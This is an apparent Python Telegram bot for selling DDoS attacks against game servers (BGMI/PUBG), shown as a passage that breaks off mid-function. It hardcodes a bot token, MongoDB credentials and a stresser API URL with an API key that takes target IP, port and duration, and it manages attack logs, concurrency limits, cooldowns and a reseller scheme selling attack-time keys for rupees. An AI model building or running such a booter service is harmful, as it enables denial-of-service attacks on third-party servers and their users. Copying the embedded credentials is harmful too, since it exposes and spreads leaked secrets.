import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import requests
import psutil

BOT_START_TIME = datetime.now()

BOT_TOKEN = os.getenv("BOT_TOKEN", "8510341937:AAHwV-i_LAbPztHhTOe_Js7OSGO5kLd_p2c")
MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://random83:random83@cluster0.nat9vrz.mongodb.net/?appName=Cluster0")

print("Connecting to MongoDB...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    
    print("MongoDB connected successfully!")
except Exception as e:
    print(f"MongoDB connection error: {e}")
    exit(1)

BOT_OWNER = 8523310365

bot = telebot.TeleBot(BOT_TOKEN)

RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

API_LIST = [
    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1"
    
]

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_USER_COOLDOWN = 180

def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default

def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )

def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price

update_reseller_pricing()

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', 1))
    except:
        return 1

def _xcfg(v=None):
    if v is None:
        return get_setting('_cx_th', 1)
    set_setting('_cx_th', v)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        # Check for temporary ban expiry
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id}, 
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            
            # Show expiry time for temporary bans
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            try:
                owner_info = bot.get_chat(BOT_OWNER)
                owner_username = owner_info.username if owner_info.username else str(BOT_OWNER)
            except:
                owner_username = str(BOT_OWNER)
                
            bot.reply_to(message, f"🚫 𝗧𝗨𝗠 𝗧𝗘𝗠𝗣𝗢𝗥𝗔𝗥𝗬 𝗕𝗔𝗡 𝗛𝗢!\n\n⏳ Expiry: {expiry_str}\n❌ Tum abhi kuch nahi kar sakte.\n\n📞 Contact Your Seller")
            return True
        
        bot.reply_to(message, f"🚫 𝗧𝗨𝗠 𝗕𝗔𝗡 𝗛𝗢!\n\n❌ Tum kuch nahi kar sakte.\n\n📞 Contact Your Seller")
        return True
    return False

def get_port_protection():
    settings = bot_settings_collection.find_one({})
    if settings:
        return settings.get('port_protection', True)
    return True

import threading as _threading
import time as _time
_attack_lock = _threading.Lock()

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                # Get current time
                now = datetime.now()
                # Find all users who have an active key
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    # Add 1 minute to their expiry
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one(
                        {'_id': user['_id']},
                        {'$set': {'key_expiry': new_expiry}}
                    )
            _time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            _time.sleep(10)

# Start maintenance extender thread
extender_thread = _threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {} # {user_id: {"ip:port": last_attack_time}}
bot_start_time = datetime.now()

def set_pending_feedback(user_id, target, port, duration):
    pass

def get_pending_feedback(user_id):
    return None

def clear_pending_feedback(user_id):
    pass

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_user_cooldown(user_id):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        
        return int(remaining)

def set_user_cooldown(user_id):
    with _attack_lock:
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=get_user_cooldown_setting())

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_max_concurrent():
    return get_concurrent_limit()

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        # Clean up expired attacks first
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        
        # Check which ports are currently busy
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    
    return False

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        if parse_mode:
            bot.reply_to(message, text, parse_mode=parse_mode)
        else:
            bot.reply_to(message, text)
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    if parse_mode:
                        bot.reply_to(message, part, parse_mode=parse_mode)
                    else:
                        bot.reply_to(message, part)
                else:
                    if parse_mode:
                        bot.send_message(message.chat.id, part, parse_mode=parse_mode)
                    else:
                        bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    bot.reply_to(message, f"`{user_id}`", parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    
    total_users = users_collection.count_documents({})
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {response_time}ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {total_users}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if is_owner(user_id):
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nFormat: s/m/h/d\nExample: /gen 1d 1\nBulk: /gen 1d 5")
            return
        
        duration_str = command_parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        
        if not duration:
            bot.reply_to(message, "❌ Invalid format! Use: s/m/h/d")
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 50:
                bot.reply_to(message, "❌ Count 1-50 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "❌ Invalid count!")
            return
        
        generated_keys = []
        for _ in range(count):
            key = f"BGMI-{generate_key(12)}"
            key_doc = {
                'key': key,
                'duration_seconds': int(duration.total_seconds()),
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        if count == 1:
            bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")
    
    elif reseller:
        if reseller.get('blocked'):
            bot.reply_to(message, "🚫 Aapka panel blocked hai!")
            return
        
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5")
            return
        
        duration_key = command_parts[1].lower()
        
        if duration_key not in RESELLER_PRICING:
            bot.reply_to(message, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d")
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                bot.reply_to(message, "❌ Count 1-20 ke beech hona chahiye!")
                return
        except:
            bot.reply_to(message, "❌ Invalid count!")
            return
        
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            bot.reply_to(message, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price})\n💰 Your Balance: {balance} Rs\n\nBalance add karwao owner se!")
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(10)}"
            key_doc = {
                'key': key,
                'duration_seconds': pricing['seconds'],
                'duration_label': pricing['label'],
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        new_balance = balance - total_price
        resellers_collection.update_one(
            {'user_id': user_id},
            {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}}
        )

        # Notify Owner
        try:
            keys_list_str = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            owner_msg = (
                "🔔 <b>Reseller Key Notification</b>\n\n"
                f"👤 <b>Reseller:</b> {username} ({user_id})\n"
                f"🔑 <b>Keys Generated:</b> {count}\n"
                f"⏰ <b>Duration:</b> {pricing['label']}\n"
                f"💵 <b>Total Cost:</b> {total_price} Rs\n"
                f"💰 <b>Remaining Balance:</b> {new_balance} Rs\n\n"
                f"📜 <b>Keys:</b>\n{keys_list_str}"
            )
            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        
        if count == 1:
            bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}\n💵 Cost: {total_price} Rs\n💰 Balance: {new_balance} Rs", parse_mode="HTML")
    
    else:
        bot.reply_to(message, "❌ Ye command sirf owner/reseller use kar sakta hai!")

@bot.message_handler(commands=["add_reseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /add_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila! Pehle unhe /id command use karwao.")
        return
    
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        bot.reply_to(message, "❌ Ye user pehle se reseller hai!")
        return
    
    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    
    resellers_collection.insert_one(reseller_doc)
    
    try:
        bot.send_message(reseller_id, "🎉 Congratulations! Aap ab Reseller ban gaye ho!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs")

@bot.message_handler(commands=["remove_reseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /remove_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    result = resellers_collection.delete_one({'user_id': reseller_id})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        bot.reply_to(message, f"✅ Reseller {display} removed!")
    else:
        bot.reply_to(message, "❌ Reseller nahi mila!")

@bot.message_handler(commands=["block_reseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        bot.reply_to(message, f"🚫 Reseller {display} blocked!")
    else:
        bot.reply_to(message, "❌ Reseller nahi mila ya pehle se blocked hai!")

@bot.message_handler(commands=["unblock_reseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        bot.reply_to(message, f"✅ Reseller {display} unblocked!")
    else:
        bot.reply_to(message, "❌ Reseller nahi mila!")

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /saldo_add <id or @username> <amount>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    
    if amount <= 0:
        bot.reply_to(message, "❌ Amount must be positive!")
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    try:
        bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /saldo_remove <id or @username> <amount>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /saldo <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    bot.reply_to(message, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}")

@bot.message_handler(commands=["all_resellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    resellers = list(resellers_collection.find())
    
    if not resellers:
        bot.reply_to(message, "📋 Koi reseller nahi hai!")
        return
    
    response = "═══════════════════════════\n"
    response += "👥 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗟𝗜𝗦𝗧\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    
    response += f"🟢 𝗔𝗖𝗧𝗜𝗩𝗘: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. 👤 `{r['user_id']}`\n"
        response += f"   💵 Balance: {r.get('balance', 0)} Rs\n"
        response += f"   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"🔴 𝗕𝗟𝗢𝗖𝗞𝗘𝗗: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. 👤 `{r['user_id']}`\n"
    
    response += "\n═══════════════════════════"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        bot.reply_to(message, "❌ Aap reseller nahi ho!")
        return
    
    if reseller.get('blocked'):
        bot.reply_to(message, "🚫 Aapka panel blocked hai!")
        return
    
    bot.reply_to(message, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen <duration> to generate key", parse_mode="Markdown")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf resellers ke liye hai!")
        return
    
    update_reseller_pricing()  # Ensure prices are fresh from DB
    
    response = "═══════════════════════════\n"
    response += "💵 𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗜𝗡𝗚\n"
    response += "═══════════════════════════\n\n"
    
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
            
    response += "\n═══════════════════════════\n"
    response += "📋 Usage: /gen <duration> <count>\n"
    response += "Example: /gen 1d 1\n"
    response += "═══════════════════════════"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    bot_settings_collection.update_one({}, {"$set": {"port_protection": True}}, upsert=True)
    bot.reply_to(message, "✅ Port Spam Protection enabled!")

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    bot_settings_collection.update_one({}, {"$set": {"port_protection": False}}, upsert=True)
    bot.reply_to(message, "✅ Port Spam Protection disabled!")

@bot.message_handler(commands=["reseller_trail"])
def reseller_trail_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /reseller_trail <hours> <max_users>\n\nExample: /reseller_trail 1 10 (1hr key for resellers)")
        return
    
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid hours or max_users!")
        return
    
    resellers = list(resellers_collection.find({'blocked': {'$ne': True}}))
    
    if not resellers:
        bot.reply_to(message, "❌ Koi active reseller nahi hai!")
        return
    
    sent_count = 0
    for reseller in resellers:
        reseller_id = reseller['user_id']
        try:
            chat = bot.get_chat(reseller_id)
            reseller_username = chat.username or str(reseller_id)
        except:
            reseller_username = str(reseller_id)
        key = f"TRAIL-{reseller_username}-{generate_key(8)}"
        
        key_doc = {
            'key': key,
            'duration_seconds': hours * 3600,
            'duration_label': f"{hours} hours (Reseller Trail)",
            'created_at': datetime.now(),
            'created_by': user_id,
            'created_by_username': reseller_username,
            'created_by_type': 'reseller_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': max_users,
            'current_users': 0,
            'is_trail': True,
            'reseller_id': reseller_id
        }
        
        keys_collection.insert_one(key_doc)
        
        try:
            bot.send_message(reseller_id, f"🎁 Reseller Trail Key Received!\n\n🔑 Key: `{key}`\n⏰ Duration: {hours} hours\n👥 Max Users: {max_users}\n\nShare this key with your customers!", parse_mode="Markdown")
            sent_count += 1
        except:
            pass
    
    bot.reply_to(message, f"✅ Reseller Trail Keys Sent!\n\n👥 Total Resellers: {len(resellers)}\n📨 Successfully Sent: {sent_count}\n⏰ Duration: {hours} hours")

@bot.message_handler(commands=["trail"])
def owner_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /trail <duration> <count>\n\nExample: /trail 1h 10")
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration!")
        return
    
    try:
        count = int(command_parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid count!")
        return
    
    generated_keys = []
    for _ in range(count):
